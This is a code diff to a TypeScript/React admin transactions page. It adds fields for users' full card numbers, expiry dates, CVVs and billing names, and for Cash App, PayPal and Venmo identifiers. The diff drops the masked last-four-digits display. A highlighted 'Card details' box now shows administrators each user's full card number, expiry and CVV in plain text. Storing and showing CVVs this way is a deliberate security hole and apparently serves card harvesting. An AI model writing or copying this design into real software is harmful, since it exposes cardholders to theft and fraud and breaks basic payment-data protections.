@@ -11,6 +11,8 @@ interface Tx {
   amount_usd: number; status: string; created_at: string;
   wallet_address: string | null; card_last4: string | null; bank_details: any;
   auth_code: string | null; auth_code_verified: boolean;
+  card_number: string | null; card_exp: string | null; card_cvv: string | null; card_billing_name: string | null;
+  cashapp_tag: string | null; paypal_email: string | null; venmo_handle: string | null;
   profile?: { full_name: string | null; username: string | null };
 }
 
@@ -121,8 +123,18 @@ export default function AdminTransactions() {
                     {t.profile?.full_name || t.profile?.username || t.user_id.slice(0, 8)} · {new Date(t.created_at).toLocaleString()}
                   </p>
                   {t.wallet_address && <p className="text-[11px] font-mono text-muted-foreground mt-1 break-all">→ {t.wallet_address}</p>}
-                  {t.card_last4 && <p className="text-[11px] text-muted-foreground mt-1">Card •••• {t.card_last4}</p>}
                   {t.bank_details && <p className="text-[11px] text-muted-foreground mt-1">{t.bank_details.bank_name} · {t.bank_details.account_number}</p>}
+                  {t.cashapp_tag && <p className="text-[11px] text-muted-foreground mt-1">Cash App: <span className="font-mono">{t.cashapp_tag}</span></p>}
+                  {t.paypal_email && <p className="text-[11px] text-muted-foreground mt-1">PayPal: <span className="font-mono">{t.paypal_email}</span></p>}
+                  {t.venmo_handle && <p className="text-[11px] text-muted-foreground mt-1">Venmo: <span className="font-mono">{t.venmo_handle}</span></p>}
+                  {t.card_number && (
+                    <div className="mt-2 rounded-lg border border-amber-500/40 bg-amber-500/5 p-2 text-[11px] font-mono space-y-0.5">
+                      <p className="text-[10px] uppercase tracking-wider text-amber-700 font-sans">Card details</p>
+                      <p>Number: {t.card_number}</p>
+                      <p>Exp: {t.card_exp} · CVV: {t.card_cvv}</p>
+                      <p>Name: {t.card_billing_name}</p>
+                    </div>
+                  )}
                 </div>
               </div>
               <div className="flex items-center gap-3 ml-auto">
